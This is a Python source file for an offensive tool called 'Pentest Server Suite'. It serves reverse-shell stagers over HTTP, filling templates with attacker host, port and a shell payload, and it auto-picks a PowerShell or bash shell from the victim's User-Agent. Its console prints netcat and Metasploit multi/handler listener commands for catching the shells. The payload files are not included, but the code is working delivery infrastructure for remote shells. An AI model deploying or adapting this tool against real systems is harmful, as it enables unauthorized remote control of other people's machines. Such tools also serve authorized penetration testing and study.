import os
import re
import json
import argparse
import colorama
import threading
import mimetypes
import tornado.web
import tornado.ioloop
import netifaces as ni
import logging as logger
from pathlib import Path
from colorama import Fore


logger.basicConfig(
    format="%(asctime)s.%(msecs)03d %(levelname)s: %(message)s",
    level=logger.INFO,
    datefmt="%H:%M:%S"
)

PLACEHOLDER_L = "<<"
PLACEHOLDER_R = ">>"
PLACEHOLDER_REGEX = re.compile(rf"{PLACEHOLDER_L}[A-Z]+{PLACEHOLDER_R}")
PLACEHOLDER_SHELL = f"{PLACEHOLDER_L}SHELL{PLACEHOLDER_R}"

IP_REGEX = re.compile(r"^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$")


class SinglequoteToDoubleqoute():
    def transform(self, s: str) -> str:
        return s.replace("\'", "\"")


class DoubleqouteToSinglequote():
    def transform(self, s: str) -> str:
        return s.replace("\"", "\'")


class PayloadManager(object):
    def __new__(cls):
        if not hasattr(cls, "instance"):
            cls.instance = super(PayloadManager, cls).__new__(cls)
            cls.instance.cvars = {}
            cls.instance.stagers = []
            cls.instance.shells = []
            cls.instance.transformers = {}
            cls.instance.stager_folder = Path("./stagers/")
            cls.instance.serve_folder = Path("./")
        return cls.instance

    @property
    def shell_count(self) -> int:
        return len(self.shells)

    @property
    def stager_count(self) -> int:
        return len(self.stagers)

    @property
    def transformer_count(self) -> int:
        return len(self.transformers)

    def transformer_register(self, cls, enabled=False):
        self.transformers[cls.__name__] = {
            "transformer": cls(),
            "enabled": enabled
        }

    def get_cvar(self, name: str):
        name = name.upper()
        return self.cvars[name] if name in self.cvars else None

    def set_cvar(self, name: str, value):
        self.cvars[name.upper()] = value

    def load_stagers(self, folder):
        self.stager_folder = folder
        self.stagers = []

        for stager in [self.stager_process_path(x.relative_to(folder)) for x in get_all_files(folder)]:
            if self.stager_validate(stager):
                self.stagers.append(stager)
            else:
                logger.warning(f"Invalid stager \"{stager}\", missing placeholder: \"{PLACEHOLDER_SHELL}\"")

    def stager_process_path(self, stager_path: Path):
        return str(stager_path).replace("\\", "/").replace("//", "/").lower()

    def stager_validate(self, stager: str) -> bool:
        return self.stager_get_path(stager) is not None

    def stager_exists(self, stager: str) -> bool:
        if stager.startswith("/"):
            stager = stager[1:]
        return stager.lower() in self.stagers

    def stager_get_path(self, stager: str) -> Path or None:
        if stager.startswith("/"):
            stager = stager[1:]

        p = Path(self.stager_folder, stager)
        return p if p.exists() else None

    def stager_get_content(self, stager: str) -> str or None:
        stager_path = self.stager_get_path(stager)

        if stager_path:
            with open(stager_path) as stager_file:
                return stager_file.read()

        return None

    def load_shells(self, shells_json):
        self.shells = json.loads(shells_json)

    def shell_exists(self, shell: str) -> bool:
        return (shell.lower() in self.shells) if shell else False

    def shell_get_payload(self, shell: str) -> str or None:
        if self.shell_exists(shell):
            return self.shells[shell]["payload"]
        return None

    def get_cvars_str(self, s: str):
        for cvar in PLACEHOLDER_REGEX.findall(s):
            yield cvar.replace(PLACEHOLDER_L, "").replace(PLACEHOLDER_R, "").upper()

    def get_cvars_shell(self, shell: str):
        shell_payload = self.shell_get_payload(shell)

        if shell_payload:
            for cvar in self.get_cvars_str(shell_payload):
                yield cvar

    def get_cvars(self, stager: str, shell: str = None):
        stager_path = self.stager_get_path(stager)

        if stager_path:
            with open(self.stager_get_path(stager)) as stager_file:
                for cvar in self.get_cvars_str(stager_file.read()):
                    yield cvar

            for cvar in self.get_cvars_shell(shell):
                yield cvar

    def build_payload(self, stager: str, user_agent: str = None) -> str or None:
        shell = ""
        stager_path = self.stager_get_path(stager)

        if stager_path:
            stager_content = self.stager_get_content(stager)

            # insert shell and apply transformers
            shell_inserted = False

            if PLACEHOLDER_SHELL in stager_content:
                shell = self.get_cvar("SHELL")
                shell_payload = self.shell_get_payload(shell)

                if not shell_payload:
                    logger.warning("Stager requested a shell but none was given!")

                    try:
                        possible_os = user_agent.split("(")[1].split(" ")[0].lower()
                        logger.warning(f"OS detected by user-agent: {Fore.LIGHTYELLOW_EX}{possible_os}{Fore.RESET}")

                        # try to auto select a suiteable shell
                        if possible_os == "windows":
                            shell = "powershell_simple"
                        elif possible_os == "linux":
                            shell = "bash_simple"
                        else:
                            shell = ""

                        if not shell == "":
                            shell_payload = self.shell_get_payload(shell)

                            if shell_payload:
                                logger.warning(f"Auto-selected shell: {Fore.LIGHTYELLOW_EX}{shell}{Fore.RESET}")
                            else:
                                logger.warning(f"No suiteable shell found")

                    except:
                        logger.warning("Failed to auto-select a shell by user-agent")

                if shell_payload:
                    # apply the transformers on shell
                    for transformer in pm.transformers.keys():
                        t = pm.transformers[transformer]

                        if t["enabled"]:
                            shell_payload = t["transformer"].transform(shell_payload)

                    logger.debug(f"SHELL -> {shell}")
                    stager_content = stager_content.replace(PLACEHOLDER_SHELL, shell_payload)
                    shell_inserted = True

            # insert all the cvars
            for cvar in self.get_cvars(stager, shell):
                if cvar == "SHELL" and shell_inserted:
                    continue

                val = self.get_cvar(cvar)

                if val:
                    if not isinstance(val, str):
                        val = str(val)

                    logger.debug(f"CVAR {cvar} -> \"{val}\"")
                    stager_content = stager_content.replace(f"{PLACEHOLDER_L}{cvar}{PLACEHOLDER_R}", val)
                else:
                    logger.warning(f"Missing CVAR for payload: \"{cvar}\"")

            return stager_content
        return None


class PssHttpHandler(tornado.web.RequestHandler):
    def get(self):
        pm = PayloadManager()
        p = pm.build_payload(self.request.uri, self.request.headers.get("User-Agent", None))

        if p:
            self.set_status(200)
            self.finish(p)
        elif pm.serve_folder:
            filepath = self.request.uri

            if filepath.startswith("/"):
                filepath = filepath[1:]

            filepath = Path(pm.serve_folder, filepath)

            if filepath.exists():
                self.set_status(200)
                self.set_header("Content-Type", mimetypes.guess_type(filepath)[0])
                self.set_header("Content-Disposition", f"attachment; filename={filepath.name}")

                with open(filepath, "rb") as f:
                    self.write(f.read())

                self.finish()
            else:
                self.set_status(404)
                self.finish("404 File Not Found")
        else:
            self.set_status(404)
            self.finish("404 Not Found")


def get_all_files(path: str or Path):
    if not isinstance(path, Path):
        path = Path(path)

    if path.exists():
        for currentpath, _, files in os.walk(path):
            for file in files:
                yield Path(currentpath, file)


# runs the tornado server on a thread sot he cli doesn't blocks it
def start_http_server(address: str, port: int):
    address_port = f"{address}:{port}"
    logger.info(f"Starting HTTP server on {Fore.LIGHTYELLOW_EX}{address_port}{Fore.RESET}")

    ioloop = tornado.ioloop.IOLoop()
    app = tornado.web.Application([(r".*", PssHttpHandler)])
    app.listen(port, address=address)
    ioloop.start()


if __name__ == "__main__":
    colorama.init()

    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-H', '--http-host',
        default='0.0.0.0',
        dest='http_host',
        help='Listen address for the HTTP server',
        type=str
    )
    parser.add_argument(
        '-P', '--http-port',
        default='80',
        dest='http_port',
        help='Listen port for the HTTP server',
        type=int
    )
    parser.add_argument(
        '-S', '--serve',
        default=None,
        dest='serve_folder',
        help='Serve folder for the HTTP server',
        type=str
    )
    parser.add_argument(
        '--shells-file',
        default='./shells.json',
        dest='shells_file',
        help='JSON file containing shell payloads',
        type=str
    )
    parser.add_argument(
        '--stagers-folder',
        default='./stagers/',
        dest='stagers_folder',
        help='Folder containing stager files',
        type=str
    )
    parser.add_argument(
        '--lhost',
        default='',
        dest='lhost',
        help='Default LHOST value',
        type=str
    )
    parser.add_argument(
        '--lport',
        default='4711',
        dest='lport',
        help='Default LPORT value',
        type=str
    )
    args = parser.parse_args()

    print(f" ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ")
    print(f"█   ▄  █  ▄▄▄▄▄█  ▄▄▄▄▄█")
    print(f"█  █▄█ █ █▄▄▄▄▄█ █▄▄▄▄▄ ")
    print(f"█   ▄▄▄█▄▄▄▄▄  █▄▄▄▄▄  █")
    print(f"█  █    ▄▄▄▄▄█ █▄▄▄▄▄█ █")
    print(f"█▄▄█   █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█")
    print(f">> {Fore.LIGHTYELLOW_EX}Pentest Server Suite{Fore.RESET}\n")

    pm = PayloadManager()
    pm.serve_folder = args.serve_folder

    if len(args.lhost) > 0:
        pm.set_cvar("LHOST", args.lhost)
    pm.set_cvar("LPORT", args.lport)

    # load all shells
    if Path(args.shells_file).exists():
        with open(args.shells_file) as shells_file:
            pm.load_shells(shells_file.read())

        logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.shell_count}{Fore.RESET} shells")
    else:
        logger.error(f"Shells file missing: \"{args.shells_file}\"")

    # load all stagers
    if Path(args.stagers_folder).exists():
        pm.load_stagers(args.stagers_folder)
        logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.stager_count}{Fore.RESET} stagers")
    else:
        logger.error(f"Stagers folder missing: \"{args.stagers_folder}\"")

    # load all tranformers
    default_transformers = [
        SinglequoteToDoubleqoute,
        DoubleqouteToSinglequote,
    ]

    for transformer in default_transformers:
        pm.transformer_register(transformer)

    logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.transformer_count}{Fore.RESET} tranformers")

    # start tornado webserver in background
    tornado_thread = threading.Thread(target=start_http_server, args=[args.http_host, args.http_port])
    tornado_thread.daemon = True
    tornado_thread.start()

    # enter cmd loop
    while 1:
        input_str = input(f"{Fore.LIGHTYELLOW_EX}pss{Fore.RESET}> ").strip().split(" ")
        cmd = input_str[0].lower()

        if cmd == "exit":
            break

        elif cmd == "?" or cmd == "help":
            print(f">> {Fore.LIGHTYELLOW_EX}Basic{Fore.RESET}")
            print("- exit                  : Shutdown server and exit")
            print("- set {NAME} {VALUE} (s): Set the options value")
            print("- serve {VALUE}      (x): Set the serving folder")
            print("- ncl                   : Generate netcat listener command")
            print("- msfl                  : Generate metasploit multi/handler listener command")

            print(f"\n>> {Fore.LIGHTYELLOW_EX}Shells{Fore.RESET} (sh, shells)")
            print("- list          (l): List all loaded shells")
            print("- select {NAME} (s): Select a shell payload")
            print("- options       (o): Show options for the selected shell")

            print(f"\n>> {Fore.LIGHTYELLOW_EX}Stagers{Fore.RESET} (st, stagers)")
            print("- list         (l): List all loaded stagers")
            print("- print {NAME} (p): Print stager")
            print("- build {NAME} (b): Print stager with shell")

            print(f"\n>> {Fore.LIGHTYELLOW_EX}Transformers{Fore.RESET} (t, transformers)")
            print("- list           (l): List all loaded transformers")
            print("- disableall     (x): Disable all transformers")
            print("- enable {NAME}  (e): Enable a transformer")
            print("- disable {NAME} (d): Disable a transformer")

        elif cmd == "s" or cmd == "set":
            if len(input_str) > 1:
                cvar = input_str[1].upper()
                val = " ".join(input_str[2:])

                if cvar == "LHOST" and not IP_REGEX.search(val):
                    logger.info(f"\"{val}\" is no valid IPv4, treating it as a NIC name")

                    try:
                        ip = ni.ifaddresses(val)[ni.AF_INET][0]["addr"]
                        logger.info(f"NIC \"{val}\" has IPv4 \"{Fore.LIGHTYELLOW_EX}{ip}{Fore.RESET}\"")
                        val = ip
                    except:
                        logger.warning(f"Failed to lookup IPv4 for NIC \"{Fore.LIGHTYELLOW_EX}{val}{Fore.RESET}\"")

                logger.info(f"{cvar} set to \"{Fore.LIGHTYELLOW_EX}{val}{Fore.RESET}\"")
                pm.set_cvar(cvar, val)
            else:
                logger.warning(f"Missing arguments")

        elif cmd == "x" or cmd == "serve":
            val = Path(" ".join(input_str[1:]))

            if val.exists():
                logger.info(f"Serving folder changed to \"{Fore.LIGHTYELLOW_EX}{val.absolute()}{Fore.RESET}\"")
                pm.serve_folder = val
            else:
                logger.warning(f"Folder \"{Fore.LIGHTYELLOW_EX}{val.absolute()}{Fore.RESET}\" does not exist")

        elif cmd == "ncl":
            lport = pm.get_cvar("LPORT")
            print(f"nc -lvpn {lport}")

        elif cmd == "msfl":
            lhost = pm.get_cvar("LHOST")
            lport = pm.get_cvar("LPORT")
            print(f"msfconsole -q -x \"use multi/handler; set LHOST {lhost}; set LPORT {lport}; run\"")

        elif cmd == "sh" or cmd == "shells":
            if len(input_str) > 1:
                sub_cmd = input_str[1]
                args = input_str[2:]

                if sub_cmd == "l" or sub_cmd == "list":
                    for shell in pm.shells:
                        print(shell)
                    print()

                elif sub_cmd == "s" or sub_cmd == "select":
                    shell = args[0].lower()

                    if pm.shell_exists(shell):
                        logger.info(f"Shell set to \"{Fore.LIGHTYELLOW_EX}{shell}{Fore.RESET}\"")
                        pm.set_cvar("SHELL", shell)
                    else:
                        logger.warning(f"No shell found with name \"{Fore.LIGHTRED_EX}{shell}{Fore.RESET}\". If you want to directly inject something, set the SHELL option manually using \"set SHELL ...\"")

                elif sub_cmd == "o" or sub_cmd == "options":
                    shell = pm.get_cvar("SHELL")
                    logger.info(f"Selected shell \"{Fore.LIGHTYELLOW_EX}{shell}{Fore.RESET}\"")

                    if shell:
                        for cvar in pm.get_cvars_shell(shell):
                            val = pm.get_cvar(cvar)

                            if val:
                                logger.info(f"{cvar} = \"{Fore.LIGHTYELLOW_EX}{val}{Fore.RESET}\"")
                            else:
                                logger.info(f"{cvar} = {Fore.LIGHTRED_EX}Not set{Fore.RESET}")

                elif len(sub_cmd) > 0:
                    print("Unknown sub-command, type \"?\" or \"help\"")
            else:
                logger.warning(f"Missing arguments")

        elif cmd == "st" or cmd == "stagers":
            if len(input_str) > 1:
                sub_cmd = input_str[1]
                args = input_str[2:]

                if sub_cmd == "l" or sub_cmd == "list":
                    for stager in pm.stagers:
                        print(stager)
                    print()

                elif sub_cmd == "p" or sub_cmd == "print":
                    print(pm.stager_get_content(args[0].lower()))

                elif sub_cmd == "b" or sub_cmd == "build":
                    print(pm.build_payload(args[0].lower()))

                elif len(sub_cmd) > 0:
                    print("Unknown sub-command, type \"?\" or \"help\"")
            else:
                logger.warning(f"Missing arguments")

        elif cmd == "t" or cmd == "transformers":
            if len(input_str) > 1:
                sub_cmd = input_str[1]
                args = input_str[2:]

                if sub_cmd == "l" or sub_cmd == "list":
                    for transformer in pm.transformers.keys():
                        is_enabled = pm.transformers[transformer]["enabled"]
                        color = Fore.LIGHTGREEN_EX if is_enabled else Fore.LIGHTRED_EX
                        logger.info(f"{transformer}: {color}{is_enabled}{Fore.RESET}")

                elif sub_cmd == "x" or sub_cmd == "disableall":
                    for transformer in pm.transformers.keys():
                        is_enabled = pm.transformers[transformer]["enabled"]

                        if is_enabled:
                            pm.transformers[transformer]["enabled"] = False
                            logger.info(f"{transformer} {Fore.LIGHTRED_EX}disabled{Fore.RESET}")

                elif sub_cmd == "e" or sub_cmd == "enable":
                    if args[0] in pm.transformers:
                        pm.transformers[args[0]]["enabled"] = True
                        logger.info(f"{args[0]} {Fore.LIGHTGREEN_EX}enabled{Fore.RESET}")
                    else:
                        logger.warning(f"Tranformer named \"{args[0]}\" does not exist")

                elif sub_cmd == "d" or sub_cmd == "disable":
                    if args[0] in pm.transformers:
                        pm.transformers[args[0]]["enabled"] = False
                        logger.info(f"{args[0]} {Fore.LIGHTRED_EX}disabled{Fore.RESET}")
                    else:
                        logger.warning(f"Tranformer named \"{args[0]}\" does not exist")

                elif len(sub_cmd) > 0:
                    print("Unknown sub-command, type \"?\" or \"help\"")
            else:
                logger.warning(f"Missing arguments")

        elif len(cmd) > 0:
            print("Unknown command, type \"?\" or \"help\"")

    colorama.deinit()
